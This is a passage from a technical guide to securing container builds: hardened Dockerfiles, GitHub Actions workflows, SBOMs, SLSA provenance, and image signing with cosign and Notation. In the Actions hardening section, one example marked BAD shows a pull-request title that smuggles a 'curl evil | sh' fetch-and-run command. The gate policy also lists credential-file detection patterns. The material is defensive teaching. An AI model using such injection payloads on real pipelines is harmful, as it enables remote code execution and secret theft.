RUN --mount=type=bind,source=go.mod,target=go.mod \
    --mount=type=bind,source=go.sum,target=go.sum \
    --mount=type=cache,target=/go/pkg/mod \
    go mod download -x

ARG TARGETOS TARGETARCH
ARG VERSION=dev
# source bind-mounted read-only: nothing from the context lands in a layer except /out/app
RUN --mount=type=bind,target=. \
    --mount=type=cache,target=/go/pkg/mod \
    --mount=type=cache,target=/root/.cache/go-build \
    GOOS=$TARGETOS GOARCH=$TARGETARCH \
    go build -ldflags="-s -w -buildid= -X main.version=${VERSION}" -o /out/app ./cmd/app

############################
# runtime stage: distroless static, non-root, no shell, no package manager
############################
FROM gcr.io/distroless/static-debian12:nonroot@sha256:<digest>
ARG BUILDKIT_SBOM_SCAN_CONTEXT=true
COPY --link --from=build /out/app /app
USER 65532:65532
ENTRYPOINT ["/app"]
```

Why each choice:
- `--platform=$BUILDPLATFORM` + `GOOS/GOARCH`: amd64 runner compiles arm64 natively → fast, no QEMU.
- `-trimpath -buildid=`: reproducible binary; Go embeds module info (`go version -m`) which Syft reads for the SBOM — keep it (don't strip `debug/buildinfo`; `-s -w` doesn't remove it).
- `COPY --link`: the final layer is independent of the base → rebasing on a new distroless digest doesn't rebuild it.
- Numeric `USER`: Kubernetes `runAsNonRoot` can only verify numeric UIDs.
- Labels/annotations are *not* hard-coded here — CI injects `org.opencontainers.image.*` from git metadata so they're always truthful.

### 6.2 Python service Dockerfile (needs native wheels → native-runner matrix or QEMU)

```dockerfile
# syntax=docker/dockerfile:1.19@sha256:<digest>
FROM python:3.13-slim-bookworm@sha256:<digest> AS build
ENV PIP_NO_CACHE_DIR=1 PIP_DISABLE_PIP_VERSION_CHECK=1 PYTHONDONTWRITEBYTECODE=1
WORKDIR /app
RUN python -m venv /venv
RUN --mount=type=bind,source=requirements.txt,target=requirements.txt \
    --mount=type=secret,id=pip_index_url,env=PIP_INDEX_URL \
    /venv/bin/pip install --require-hashes --no-deps -r requirements.txt
COPY src/ ./src/

FROM python:3.13-slim-bookworm@sha256:<digest>
RUN groupadd -g 10001 app && useradd -u 10001 -g 10001 -M -s /usr/sbin/nologin app
COPY --link --from=build /venv /venv
COPY --link --from=build /app/src /app/src
ENV PATH=/venv/bin:$PATH PYTHONUNBUFFERED=1
USER 10001:10001
ENTRYPOINT ["python", "-m", "src.main"]
```

Note the private index URL (which often embeds a token) comes in as a **secret mount**, not a build arg.

### 6.3 Dockerfile rules the gate enforces (and why)

| Rule | Gate check | Why |
|---|---|---|
| Non-root numeric `USER` | `config.root-user` | PSA restricted / `runAsNonRoot` |
| No secret-like `ENV` | `config.secret-env` | Config is world-readable to anyone who pulls |
| No `ARG` secrets | `config.history-secret` | History records `RUN |N KEY=value` |
| No forbidden files (`.git`, `.env`, keys) in any layer | `layer.forbidden-path`, `layer.secret-content` | Deleted ≠ gone (§3.1) |
| No setuid/setgid binaries | `layer.setuid` | Privilege escalation inside container |
| OCI labels present | `config.missing-label` | Traceability; Kyverno/Scanners use them |
| Base images from allowlist | `attest.base-not-allowed` | Stops `FROM randomuser/python` |
| ≤ N layers, ≤ size budget | `image.too-many-layers`, `image.too-large` | Pull time, attack surface |
| SBOM + provenance exist | `attest.missing-*` | Required downstream |
| diffIDs match | `image.diffid-mismatch` | Integrity of the layout |

Complementary linters: `hadolint` (Dockerfile style/security), `docker build --check` (BuildKit's built-in checks, e.g. `SecretsUsedInArgOrEnv`, `FromPlatformFlagConstDisallowed`) — make `--check` a required CI step:

```bash
docker buildx build --check .     # fails on rule violations; configure with # check=error=true
```

---

## 7. Build control, part 3: GitHub Actions hardening

### 7.1 The non-negotiables

1. **`permissions: {}` at workflow top**, grant per job. `GITHUB_TOKEN` defaults are too broad.
2. **Pin every action to a full commit SHA** (`uses: actions/checkout@<40-hex> # v5.0.0`). Tags are mutable — the `tj-actions/changed-files` compromise (March 2025) exfiltrated secrets from thousands of repos via a moved tag. Renovate `helpers:pinGitHubActionDigests` maintains this. *In this guide I write `@vN` for readability; replace with SHAs.*
3. **Never interpolate untrusted input into `run:`**:
   ```yaml
   # BAD — PR title "a\"; curl evil | sh; echo \"" executes
   run: echo "${{ github.event.pull_request.title }}"
   # GOOD
   env: { TITLE: "${{ github.event.pull_request.title }}" }
   run: echo "$TITLE"
   ```
4. **No `pull_request_target` + checkout of PR head** (runs untrusted code with write token/secrets).
5. **`actions/checkout` with `persist-credentials: false`** so later steps (your Dockerfile `RUN`s!) can't read the token from `.git/config`.
6. **Separate build from signing.** The job that executes the Dockerfile has no `id-token: write`, no `packages: write`, no secrets. The job that signs runs no project code.
7. **Protected `environment`** on the publish job: deployment branch/tag rules (`v*` only), required reviewers if you want a human gate. OIDC tokens then carry `environment:production` — you can require it in cloud trust policies (KMS for Notation).
8. **Hand-off integrity**: artifacts passed between jobs are hashed in the producer and verified in the consumer.
9. **Ephemeral runners.** GitHub-hosted runners are fresh VMs. Self-hosted persistent runners break SLSA L3 isolation and let one job poison the next. If self-hosting, use ARC with ephemeral pods.
10. **Static analysis of workflows**: `zizmor` (security) and `actionlint` (correctness) as required checks. **Runtime egress monitoring**: `step-security/harden-runner` (start in `audit`, move to `block` with an allowlist).

### 7.2 OIDC in one paragraph

With `permissions: id-token: write`, a job can request a short-lived JWT from `https://token.actions.githubusercontent.com` whose claims include `repository`, `ref`, `sha`, `workflow_ref` (`acme/app/.github/workflows/release.yml@refs/tags/v1.2.3`), `job_workflow_ref` (the reusable workflow, if any), `event_name`, `environment`, `runner_environment`. Sigstore's Fulcio exchanges that JWT for a 10-minute X.509 cert embedding those claims; AWS/Azure/GCP exchange it for cloud credentials. **Every trust decision downstream is a check on these claims** — so the claims you pin in policy (§12) must be the ones an attacker can't satisfy: the *repository*, the *workflow file*, and the *ref* (tag pattern), not just "any workflow in the org".

### 7.3 PR workflow (`ci.yml`) — build and gate, never sign

```yaml
name: ci
on:
  pull_request:
permissions: {}
jobs:
  build-and-gate:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: step-security/harden-runner@v2
        with: { egress-policy: audit }
      - uses: actions/checkout@v5
        with: { persist-credentials: false }
      - run: python3 ci/check_dockerfile_pins.py Dockerfile
      - uses: docker/setup-buildx-action@v3
      - name: Dockerfile checks
        run: docker buildx build --check .
      - name: Build to OCI layout
        uses: docker/build-push-action@v6
        with:
          context: .
          platforms: linux/amd64,linux/arm64
          push: false
          outputs: type=oci,dest=out/layout,tar=false
          labels: |
            org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
            org.opencontainers.image.revision=${{ github.sha }}
          sbom: true
          provenance: mode=max
          cache-from: type=gha,scope=pr-${{ github.event.number }}
          cache-to: type=gha,scope=pr-${{ github.event.number }},mode=max
      - uses: actions/setup-python@v6
        with: { python-version: "3.14" }
      - run: python3 ci/inspect_image.py --layout out/layout --policy ci/image-policy.json --report out/gate-report.json
```

---

## 8. SBOM

### 8.1 What it is and the two standards

An SBOM is a machine-readable inventory of components. Two standards dominate:

| | **SPDX** (Linux Foundation, ISO/IEC 5962) | **CycloneDX** (OWASP, ECMA-424) |
|---|---|---|
| Current versions | 2.3 (ubiquitous), 3.0 (graph/JSON-LD) | 1.6 / 1.7 |
| Strength | licensing, relationships, wide tooling | security use-cases, VEX, services, ML-BOM |
| in-toto predicate type | `https://spdx.dev/Document` | `https://cyclonedx.org/bom` |
| cosign `--type` | `spdxjson` | `cyclonedx` |
| BuildKit default | ✅ SPDX | — |

Both are fine. Choose one as your org's canonical format; convert with `syft convert in.spdx.json -o cyclonedx-json`.

Minimal SPDX package entry you'll see from Syft:

```json
{
  "SPDXID": "SPDXRef-Package-go-module-golang.org-x-net-abc123",
  "name": "golang.org/x/net",
  "versionInfo": "v0.38.0",
  "externalRefs": [
    { "referenceCategory": "PACKAGE-MANAGER", "referenceType": "purl",
      "referenceLocator": "pkg:golang/golang.org/x/net@v0.38.0" }
  ]
}
```

The **purl** (package URL) is the join key between SBOMs, vulnerability databases and VEX. If your SBOM lacks purls, your scanning is guesswork.

### 8.2 Where to generate it

| Approach | Tool | Sees | Misses |
|---|---|---|---|
| **Build-time, in BuildKit** | `--sbom=true` (Syft scanner) | final image fs; with `BUILDKIT_SBOM_SCAN_STAGE`, build stages too | nothing extra vs image scan, but runs *inside* the build |
| **Post-build, image scan** | `syft <image>`, `trivy image --format spdx-json` | OS packages, language manifests, Go/Rust binary metadata | statically linked C libs, vendored code, curl-installed binaries |
| **Source scan** | `syft dir:.`, `cdxgen` | declared deps incl. dev/test | what actually shipped |

Use build-time (or post-build image) SBOM as the attested artifact; it describes the thing you ship. In our pipeline the gate extracts BuildKit's SBOM, scans it, then signs **that exact file** — scanned == attested.

Gotchas:
- **Distroless/scratch**: no package DB → Syft relies on distroless's `/var/lib/dpkg/status.d/*` files (present) and binary metadata. Verify the package count isn't ~0 (the gate reports `sbomPackages`).
- **`curl | tar` installs** are invisible. If you must, add them manually (`syft` can't know) or prefer distro packages.
- SBOM is a snapshot — vulns are found later. Re-scan stored SBOMs daily (Dependency-Track, GUAC, Grype on a cron) rather than re-pulling images.

### 8.3 Vulnerability scanning and VEX

```bash
grype sbom:out/attestations/linux_amd64.sbom.spdx.json --fail-on high --only-fixed
trivy sbom out/attestations/linux_amd64.sbom.spdx.json --severity HIGH,CRITICAL --exit-code 1
```

**VEX** (Vulnerability Exploitability eXchange) states "CVE-X does not affect product Y because…". OpenVEX example:

```json
{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "@id": "https://acme.example/vex/app-2026-10-13",
  "author": "platform-security@acme.example",
  "timestamp": "2026-10-13T00:00:00Z",
  "version": 1,
  "statements": [{
    "vulnerability": { "name": "CVE-2026-12345" },
    "products": [{ "@id": "pkg:oci/app@sha256:7333…?repository_url=ghcr.io/acme/app" }],
    "status": "not_affected",
    "justification": "vulnerable_code_not_in_execute_path"
  }]
}
```

`grype --vex vex.json …` honours it. Attest it with `cosign attest --type openvex --predicate vex.json`.

### 8.4 Storage options for an SBOM

1. **BuildKit attestation manifest** in the index — unsigned, travels with the image.
2. **Signed in-toto attestation** (`cosign attest`) — referrer of the digest. ← what Kyverno checks.
3. **Plain OCI artifact** referrer (`oras attach --artifact-type application/spdx+json`) + Notation signature on that artifact.
4. **GitHub artifact attestation** (`actions/attest-sbom`) — stored in GitHub's attestation API, optionally pushed to the registry.

---

## 9. Provenance (SLSA + in-toto)

### 9.1 The envelope stack

```
DSSE envelope  { payloadType: "application/vnd.in-toto+json", payload: base64(Statement), signatures: [...] }
  └─ in-toto Statement v1
       { "_type": "https://in-toto.io/Statement/v1",
         "subject": [ { "name": "ghcr.io/acme/app", "digest": { "sha256": "7333…" } } ],
         "predicateType": "https://slsa.dev/provenance/v1",
         "predicate": { … } }
```

- **Subject** = the digest(s) this claim is about. Attestations bind to digests just like signatures.
- **Predicate type** = the schema of the claim (provenance, SBOM, vuln, your custom gate).
- **DSSE** (Dead Simple Signing Envelope) signs `PAE(payloadType, payload)` — this prevents type-confusion attacks where a signed payload is reinterpreted as another type.
- With Sigstore, the DSSE envelope + cert + transparency log proof are packaged in a **Sigstore bundle** (`application/vnd.dev.sigstore.bundle.v0.3+json`).

### 9.2 SLSA Provenance v1, annotated (as GitHub's attest action produces)

```json
{
  "buildDefinition": {
    "buildType": "https://actions.github.io/buildtypes/workflow/v1",
    "externalParameters": {
      "workflow": {
        "ref": "refs/tags/v1.2.3",
        "repository": "https://github.com/acme/app",
        "path": ".github/workflows/release.yml"
      }
    },
    "internalParameters": {
      "github": {
        "event_name": "push",
        "repository_id": "123456789",
        "repository_owner_id": "987654",
        "runner_environment": "github-hosted"
      }
    },
    "resolvedDependencies": [{
      "uri": "git+https://github.com/acme/app@refs/tags/v1.2.3",
      "digest": { "gitCommit": "6f1c2e…" }
    }]
  },
  "runDetails": {
    "builder": { "id": "https://github.com/acme/app/.github/workflows/release.yml@refs/tags/v1.2.3" },
    "metadata": { "invocationId": "https://github.com/acme/app/actions/runs/1111/attempts/1" }
  }
}
```

What a verifier should check (this is the policy, not just "a provenance exists"):
1. Signature identity = your release workflow (or the trusted reusable builder for L3).
2. `subject.digest` = the digest being deployed.
3. `externalParameters.workflow.repository` = expected repo; `.ref` matches `refs/tags/v*`.
4. `resolvedDependencies[].digest.gitCommit` is on a protected branch (optional, advanced: check via API or a VSA).
5. `runner_environment = github-hosted`.

### 9.3 Three provenance producers, compared

| Producer | Signed? | SLSA level | Content | Where stored |
|---|---|---|---|---|
| BuildKit `--provenance=mode=max` | ❌ | L1 | very detailed: Dockerfile, build args, base image digests, LLB | attestation manifest in the index |
| `actions/attest-build-provenance` | ✅ Sigstore (public-good for public repos, GitHub's instance for private) | L2 (L3 if called from a trusted reusable workflow) | workflow-level (repo, ref, commit, run) | GitHub attestations API, + registry with `push-to-registry: true` |
| `slsa-framework/slsa-github-generator` container workflow | ✅ Sigstore public-good | **L3** | workflow-level | registry (cosign `.att` / bundle) |

Use **both** BuildKit (rich, for forensics and the gate) and a signed one (for admission). They answer different questions.

### 9.4 Verification Summary Attestations (VSA)

At scale, admission controllers re-verifying full provenance chains is expensive. A **VSA** (`https://slsa.dev/verification_summary/v1`) is "verifier X checked digest D against policy P at time T: PASSED, SLSA_BUILD_LEVEL_3". Your custom gate report attestation (§11) is a lightweight, home-grown cousin of this.

---

## 10. Signing: Sigstore/cosign vs Notary Project/Notation

Yes — in 2026 the two serious options are **Sigstore (cosign)** and **Notary Project (Notation)**. Docker Content Trust (Notary *v1*) is legacy; don't build anything new on it.

### 10.1 What exactly is signed

You sign the **manifest digest** (for multi-arch: the **index** digest). The signature payload says, effectively, "digest D in repo R". Since the index contains platform manifest digests, which contain layer digests, signing the index transitively covers every byte — **as long as clients pull through the index**. If a deployment references a platform manifest digest directly (`app@sha256:<amd64>`), a verifier looking for signatures on that digest won't find one unless you also signed it → `cosign sign --recursive` signs index **and** each child.

### 10.2 Sigstore deep dive

Components:

| Component | Role |
|---|---|
| **OIDC provider** (GitHub Actions, Google, …) | proves *who* the signer is |
| **Fulcio** | CA: exchanges OIDC token for a ~10-minute X.509 cert whose SAN = identity, with extensions for CI claims |
| **Rekor** | append-only transparency log; signing event is logged; returns signed inclusion proof / timestamp |
| **TSA** (RFC 3161) | optional/alternative trusted timestamp |
| **TUF root** | distributes Fulcio/Rekor/CT public keys (`trusted_root.json`) securely |
| **CT log** | Fulcio issues certs into a certificate-transparency log (SCT embedded) |

Why short-lived certs work: verification checks the signature was made *while the cert was valid*, proven by the Rekor/TSA timestamp. There's no long-lived private key to steal; the key is ephemeral, in memory, discarded.

**Keyless flow in GitHub Actions**:

```
job (id-token: write) ─OIDC JWT─► Fulcio ─cert(SAN = https://github.com/acme/app/.github/workflows/release.yml@refs/tags/v1.2.3)─►
cosign signs digest with ephemeral key ─► Rekor entry (+ inclusion proof) ─► bundle stored as OCI referrer of the digest
```

Fulcio cert extensions for GitHub (OID prefix `1.3.6.1.4.1.57264.1.`), which cosign exposes as flags:

| OID suffix | Meaning | cosign verify flag |
|---|---|---|
| `.8` | Issuer | `--certificate-oidc-issuer` |
| `.9` / `.10` | Build Signer URI / digest (workflow file @ ref / commit) | identity = SAN |
| `.11` | Runner environment (`github-hosted`/`self-hosted`) | — |
| `.12` / `.13` / `.14` | Source repo URI / commit / ref | `--certificate-github-workflow-repository`, `-sha`, `-ref` |
| `.18` / `.19` | Build config URI / digest | — |
| `.20` | Build trigger (`push`, `workflow_dispatch`…) | `--certificate-github-workflow-trigger` |
| `.21` | Run invocation URI | — |
| `.22` | Source repo visibility at signing | — |

**Cosign v3 changes you must know** (v3.0 landed in late 2025; 3.1.x is current as I write):
- The **standardised Sigstore bundle** format is the default output and input for signing/verifying.
- Container signatures and attestations are stored as **OCI 1.1 referring artifacts** (with fallback tag for registries lacking the API), not the legacy `sha256-<hex>.sig` / `.att` tags.
- Trust roots and service URLs come from `--trusted-root` / `--signing-config` (TUF-distributed signing config by default).
- Older-format verification still works (auto-detected); `--new-bundle-format=false` remains as an escape hatch in 3.1 but is deprecated. **Make sure your verifier (Kyverno version, policy-controller, etc.) supports the format you emit — test before enforcing.**

**Key-based / KMS mode** (no OIDC, no public log if you choose):

```bash
cosign generate-key-pair --kms awskms:///alias/acme-image-signing
cosign sign --key awskms:///alias/acme-image-signing ghcr.io/acme/app@sha256:…
cosign verify --key awskms:///alias/acme-image-signing ghcr.io/acme/app@sha256:…   # or --key cosign.pub
```

**Privacy warning (often missed):** keyless signing with the **public-good** Sigstore instance writes your cert to the public Rekor log — that includes your **repository name, workflow path, ref and commit**. For private repos that's an information leak. Options: GitHub artifact attestations (private repos use GitHub's own Sigstore instance with no public log), KMS keys with `--tlog-upload=false`, or a private Sigstore deployment (with your own `trusted_root.json`).

### 10.3 cosign cheat-sheet

```bash
IMG=ghcr.io/acme/app@sha256:7333…
ID='https://github.com/acme/app/.github/workflows/release.yml@refs/tags/v1.2.3'
ISS=https://token.actions.githubusercontent.com

cosign sign --yes --recursive -a git.sha=6f1c2e $IMG                     # keyless in CI
cosign verify $IMG --certificate-identity "$ID" --certificate-oidc-issuer $ISS
cosign verify $IMG --certificate-identity-regexp '^https://github\.com/acme/app/\.github/workflows/release\.yml@refs/tags/v' \
                   --certificate-oidc-issuer $ISS \
                   --certificate-github-workflow-repository acme/app \
                   --certificate-github-workflow-trigger push
cosign attest --yes --type spdxjson --predicate sbom.spdx.json $IMG       # SBOM attestation
cosign attest --yes --type https://acme.example/attestations/image-gate/v1 --predicate gate.json $IMG
cosign verify-attestation $IMG --type spdxjson --certificate-identity "$ID" --certificate-oidc-issuer $ISS \
  | jq -r '.payload' | base64 -d | jq '.predicate.packages | length'
cosign tree ghcr.io/acme/app:1.2.3                                        # list sigs/atts/sboms
cosign download attestation $IMG | jq -r .payload | base64 -d | jq .predicateType
cosign copy ghcr.io/acme/app:1.2.3 registry.internal/acme/app:1.2.3       # copies sigs+atts too
```

Identity regex pitfalls: **always anchor** (`^…$`), escape dots, and pin the workflow file and ref. `.*acme.*` matches `github.com/evil/acme-fork`. `github.com/acme/` without a workflow path means *any* workflow in *any* acme repo can produce trusted images, including one a contractor can edit.

### 10.4 Notary Project / Notation deep dive

Model: **classic X.509 PKI**. You (or your cloud) run a CA; signing keys live in a KMS/HSM; signing certs chain to your root; verifiers trust your root via a **trust store** and a **trust policy**.

| Concept | Description |
|---|---|
| Signature envelope | **JWS** or **COSE** (`--signature-format cose`); the payload is the target descriptor (digest, mediaType, size) + optional annotations |
| Storage | OCI 1.1 referrer, `artifactType: application/vnd.cncf.notary.signature` |
| Plugins | key/signing providers: AWS Signer, Azure Key Vault, HashiCorp Vault, etc. Key never leaves the KMS |
| Trust store | named sets of certs by type: `ca`, `signingAuthority`, `tsa` |
| Trust policy | maps registry scopes → required trust stores + trusted identities (cert subject DN) + verification level |
| Timestamping | RFC 3161 TSA countersignature (`--timestamp-url`) so signatures stay valid after the signing cert expires |
| Revocation | OCSP / CRL checking of signing certs (AWS Signer also supports revoking signing profiles/jobs) |

Local learning setup:

```bash
notation cert generate-test --default "acme.example"         # test CA + key, adds to trust store "acme.example"
notation sign --signature-format cose ghcr.io/acme/app@sha256:7333…
notation ls ghcr.io/acme/app@sha256:7333…
notation inspect ghcr.io/acme/app@sha256:7333…

cat > trustpolicy.json <<'EOF'
{
  "version": "1.0",
  "trustPolicies": [{
    "name": "acme-release",
    "registryScopes": ["ghcr.io/acme/app"],
    "signatureVerification": { "level": "strict" },
    "trustStores": ["ca:acme.example"],
    "trustedIdentities": ["x509.subject: CN=acme.example,O=Notary,L=Seattle,ST=WA,C=US"]
  }]
}
EOF
notation policy import trustpolicy.json
notation verify ghcr.io/acme/app@sha256:7333…
```

(The test cert's subject DN is printed by `notation cert ls` / `notation cert show`; use the real one from your CA in production.)

Verification levels: `strict` (everything enforced), `permissive` (logs expiry/revocation failures), `audit` (only integrity), `skip`.

Signing an SBOM with Notation (Notation signs OCI artifacts; it has no in-toto "attest" verb):

```bash
oras attach --artifact-type application/spdx+json ghcr.io/acme/app@sha256:7333… sbom.spdx.json
SBOM_DIGEST=$(oras discover --format json --artifact-type application/spdx+json ghcr.io/acme/app@sha256:7333… \
              | jq -r '.referrers[0].digest')    # output shape varies by oras version; check yours
notation sign ghcr.io/acme/app@$SBOM_DIGEST
```

### 10.5 Comparison and decision

| | **cosign (Sigstore)** | **Notation (Notary Project)** |
|---|---|---|
| Trust model | Identity-based (OIDC) + transparency log; or keys/KMS | X.509 PKI, your CA |
| Long-lived keys | none (keyless) | yes, in KMS/HSM |
| Setup effort in GitHub | trivial (`id-token: write`) | KMS + CA + plugin + OIDC role |
| Transparency log | Rekor (public or private) | none (TSA for time) |
| Revocation | no cert revocation (certs expire in minutes); you "revoke" by tightening policy | OCSP/CRL, profile revocation |
| Attestations (in-toto) | first-class (`cosign attest`) | sign arbitrary artifacts; no native in-toto attest |
| Air-gapped | possible but needs private Sigstore/TUF | natural |
| Kyverno support | ✅ | ✅ |
| Typical fit | open source, GitHub-native, fast adoption | regulated enterprises, existing PKI, Azure/AWS-centric |

**Recommendation for your case** (GitHub Actions → k8s with Kyverno): **cosign keyless as the primary**, plus **GitHub artifact attestations for provenance**. Add **Notation via KMS** if you have a compliance requirement for org-owned PKI, revocation, or offline verification — you can dual-sign the same digest; both live as independent referrers.

---

## 11. The pipeline, end to end

### 11.1 Gate policy — `ci/image-policy.json`

```json
{
  "require_platforms": ["linux/amd64", "linux/arm64"],
  "max_layers": 20,
  "max_uncompressed_bytes": 300000000,
  "forbid_root_user": true,
  "required_labels": [
    "org.opencontainers.image.source",
    "org.opencontainers.image.revision",
    "org.opencontainers.image.version"
  ],
  "allow_setuid_paths": [],
  "require_sbom": true,
  "require_provenance": true,
  "allowed_base_image_regexes": [
    "^pkg:docker/(library/)?golang@",
    "^pkg:docker/gcr\\.io/distroless/",
    "^pkg:docker/docker/dockerfile@",
    "^pkg:docker/docker/buildkit-syft-scanner@"
  ]
}
```

The allowlist matches the purl URIs BuildKit records in provenance materials; the exact purl spelling depends on BuildKit version (with or without `library/`, registry host prefix). **Run the gate once with an empty allowlist, read `report.platforms.*.baseImages`, then write the regexes** from what you see.

The gate script is in [Appendix A](#appendix-a--inspect_imagepy-full-source). Sample output on a deliberately bad image:

```
[ERROR] linux/amd64    config.secret-env          ENV GH_TOKEN looks like a secret baked into the image config
[ERROR] linux/amd64    config.history-secret      history[0] exposes NPM_TOKEN=... (use RUN --mount=type=secret)
[ERROR] linux/amd64    layer.forbidden-path       layer 0 (sha256:15b2cc714a57): /root/.aws/credentials matches (^|/)\.aws/credentials$
[ERROR] linux/amd64    layer.setuid               layer 0 (sha256:15b2cc714a57): /usr/bin/su mode 0o4755
[ERROR] linux/amd64    layer.deleted-secret       /root/.aws/credentials was deleted in layer 1 but is still retrievable from layer 0
[ERROR] linux/amd64    attest.base-not-allowed    base/build image pkg:docker/evil/base@1 not in allowlist
[ERROR] linux/arm64    config.root-user           image runs as root (User='root'); set USER to a numeric non-root uid
...
image sha256:733310f9… -> FAIL (15 errors)
```

It writes `gate-report.json` (`result`, `imageDigest`, per-platform summary, all findings), `digests.json`, and per-platform `*.sbom.spdx.json` / `*.buildkit-provenance.json`.

### 11.2 Release workflow — `.github/workflows/release.yml`

```yaml
name: release-image

on:
  push:
    tags: ["v*.*.*"]

permissions: {}            # deny-all; each job opts in

concurrency:
  group: release-${{ github.ref }}
  cancel-in-progress: false

env:
  PLATFORMS: linux/amd64,linux/arm64
  # Pin these; check upstream for current versions.
  BUILDKIT_IMAGE: moby/buildkit:v0.25.1

jobs:
  # ────────────────────────────────────────────────────────────────────────────
  # 1. BUILD — executes the Dockerfile (i.e. untrusted-ish code). No push, no OIDC, no secrets.
  # ────────────────────────────────────────────────────────────────────────────
  build:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    outputs:
      image: ${{ steps.vars.outputs.image }}
      epoch: ${{ steps.vars.outputs.epoch }}
      tags_json: ${{ steps.meta.outputs.json }}
      layout_sha256: ${{ steps.pack.outputs.sha256 }}
    steps:
      - uses: step-security/harden-runner@v2          # pin SHA
        with:
          egress-policy: audit

      - uses: actions/checkout@v5                     # pin SHA
        with:
          persist-credentials: false

      - id: vars
        run: |
          echo "image=ghcr.io/${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"   # registry names must be lowercase
          echo "epoch=$(git log -1 --pretty=%ct)"     >> "$GITHUB_OUTPUT"   # reproducible timestamps

      - name: Lint — base images and frontend pinned by digest
        run: python3 ci/check_dockerfile_pins.py Dockerfile

      # Only needed if a stage RUNs on the target platform; cross-compiled Go doesn't.
      # - uses: docker/setup-qemu-action@v3

      - uses: docker/setup-buildx-action@v3
        with:
          driver-opts: image=${{ env.BUILDKIT_IMAGE }}

      - name: Dockerfile checks
        run: docker buildx build --check .

      - id: meta
        uses: docker/metadata-action@v5
        env:
          DOCKER_METADATA_ANNOTATIONS_LEVELS: manifest,index
        with:
          images: ${{ steps.vars.outputs.image }}
          tags: |
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha,format=long
          labels: |
            org.opencontainers.image.vendor=Acme

      - name: Build multi-arch image to an OCI layout (no push)
        uses: docker/build-push-action@v6
        env:
          SOURCE_DATE_EPOCH: ${{ steps.vars.outputs.epoch }}
        with:
          context: .
          platforms: ${{ env.PLATFORMS }}
          push: false
          outputs: type=oci,dest=out/layout,tar=false,rewrite-timestamp=true
          labels: ${{ steps.meta.outputs.labels }}
          annotations: ${{ steps.meta.outputs.annotations }}
          build-args: |
            VERSION=${{ steps.meta.outputs.version }}
          sbom: true
          provenance: mode=max
          no-cache: true            # releases don't consume caches others could have written

      - id: pack
        name: Pack layout and hash it (hand-off integrity)
        run: |
          tar -C out -cf layout.tar layout
          echo "sha256=$(sha256sum layout.tar | cut -d' ' -f1)" >> "$GITHUB_OUTPUT"

      - uses: actions/upload-artifact@v4
        with:
          name: oci-layout
          path: layout.tar
          retention-days: 3
          if-no-files-found: error

  # ────────────────────────────────────────────────────────────────────────────
  # 2. GATE — inspects the exact bytes that will ship. No credentials.
  # ────────────────────────────────────────────────────────────────────────────
  gate:
    needs: build
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    outputs:
      index_digest: ${{ steps.gate.outputs.index_digest }}
      platform_digests: ${{ steps.gate.outputs.platform_digests }}
    steps:
      - uses: actions/checkout@v5
        with:
          persist-credentials: false
          sparse-checkout: ci

      - uses: actions/download-artifact@v4
        with:
          name: oci-layout

      - name: Verify artifact integrity
        env:
          EXPECTED: ${{ needs.build.outputs.layout_sha256 }}
        run: |
          echo "${EXPECTED}  layout.tar" | sha256sum -c -
          mkdir -p out && tar -C out -xf layout.tar

      - uses: actions/setup-python@v6
        with:
          python-version: "3.14"        # stdlib zstd support

      - id: gate
        name: Layer / config / attestation gate
        run: |
          python3 ci/inspect_image.py \
            --layout out/layout \
            --policy ci/image-policy.json \
            --report out/attestations/gate-report.json \
            --extract-dir out/attestations \
            --source-date-epoch "${{ needs.build.outputs.epoch }}" \
            --github-output

      - uses: anchore/scan-action/download-grype@v6    # pin SHA; check current major
        id: grype

      - name: Vulnerability gate on the SBOMs we will attest
        env:
          GRYPE: ${{ steps.grype.outputs.cmd }}
        run: |
          for sbom in out/attestations/*.sbom.spdx.json; do
            echo "::group::$sbom"
            "$GRYPE" "sbom:$sbom" --fail-on high --only-fixed
            echo "::endgroup::"
          done

      - name: Job summary
        if: always()
        run: |
          {
            echo "### Image gate"
            jq -r '"**Result:** \(.result) — \(.errorCount) errors — `\(.imageDigest)`"' out/attestations/gate-report.json
            echo
            echo "| platform | digest | layers | MB | user | SBOM pkgs |"
            echo "|---|---|---|---|---|---|"
            jq -r '.platforms | to_entries[] | "| \(.key) | `\(.value.manifestDigest[7:19])` | \(.value.layers) | \(.value.uncompressedBytes/1048576|floor) | \(.value.user) | \(.value.sbomPackages) |"' \
              out/attestations/gate-report.json
          } >> "$GITHUB_STEP_SUMMARY"

      - uses: actions/upload-artifact@v4
        with:
          name: attestation-inputs
          path: out/attestations/
          if-no-files-found: error

  # ────────────────────────────────────────────────────────────────────────────
  # 3. PUBLISH — push the gated digest, sign, attest, promote. Runs no project code.
  # ────────────────────────────────────────────────────────────────────────────
  publish:
    needs: [build, gate]
    runs-on: ubuntu-24.04
    environment: production            # protect: tags v* only, optional reviewers
    permissions:
      contents: read
      packages: write                  # push to GHCR
      id-token: write                  # Sigstore keyless + attest action
      attestations: write              # GitHub attestations API
    env:
      IMAGE: ${{ needs.build.outputs.image }}
      DIGEST: ${{ needs.gate.outputs.index_digest }}
      PLATFORM_DIGESTS: ${{ needs.gate.outputs.platform_digests }}
      STAGING_TAG: ci-${{ github.run_id }}-${{ github.run_attempt }}
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: oci-layout
      - uses: actions/download-artifact@v4
        with:
          name: attestation-inputs
          path: att

      - name: Verify artifact integrity
        env:
          EXPECTED: ${{ needs.build.outputs.layout_sha256 }}
        run: |
          echo "${EXPECTED}  layout.tar" | sha256sum -c -
          mkdir -p out && tar -C out -xf layout.tar
          test "$(jq -r .result att/gate-report.json)" = pass

      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Push to quarantine tag, byte-for-byte
        run: |
          skopeo copy --all --preserve-digests \
            --dest-authfile "$HOME/.docker/config.json" \
            oci:out/layout "docker://${IMAGE}:${STAGING_TAG}"

      - name: Assert registry digest == gated digest
        run: |
          remote="sha256:$(skopeo inspect --raw --authfile "$HOME/.docker/config.json" \
                    "docker://${IMAGE}:${STAGING_TAG}" | sha256sum | cut -d' ' -f1)"
          echo "gated=${DIGEST} remote=${remote}"
          test "$remote" = "$DIGEST"

